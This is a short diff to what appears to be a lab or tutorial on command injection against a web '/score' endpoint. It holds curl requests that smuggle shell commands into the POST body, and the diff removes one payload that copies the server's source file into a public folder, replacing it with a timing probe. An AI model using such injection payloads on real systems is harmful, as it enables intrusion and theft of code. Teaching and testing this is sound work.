@@ -25,6 +25,5 @@ curl -X POST http://website_ip/score -d '""; bash -c "sleep 5" #'
 ```
 
 ```bash
-curl -X POST http://website_ip/score -d '""; bash -c "cat webserver.rb > public/test.txt" #'
+curl -X POST http://website_ip/score -d '""; bash -c "sleep 10" #'
 ```
-Note: All files in the public/ folder are accessible from the website_ip/ root. 
